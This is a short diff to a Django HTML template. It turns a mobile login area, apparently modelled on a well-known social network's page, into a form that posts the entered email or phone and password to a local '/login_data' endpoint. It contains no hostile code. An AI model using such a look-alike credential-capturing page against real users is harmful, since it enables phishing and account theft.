@@ -323,13 +323,17 @@
       </a>
     </div>
     <div class="mobmaindiv">
-      <div id="mobtextdiv">
-        <input type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address">
-        <input type="password" class="mobtextbox mobtextbox2" placeholder="Password">
-      </div>
-      <div class="mobloginbuttondiv">
-        <input type="submit" class="mobloginbutton" value="Log In">
-      </div>
+      <form action="/login_data" method="post">
+        {% csrf_token %}
+        <div id="mobtextdiv">
+          <input type="text" class="mobtextbox mobtextbox1" placeholder="Mobile number or email address"
+            name="email_phone">
+          <input type="password" class="mobtextbox mobtextbox2" placeholder="Password" name="pwd">
+        </div>
+        <div class="mobloginbuttondiv">
+          <input type="submit" class="mobloginbutton" value="Log In">
+        </div>
+      </form>
       <div id="ordiv">
         <span id="or">or</span>
       </div>
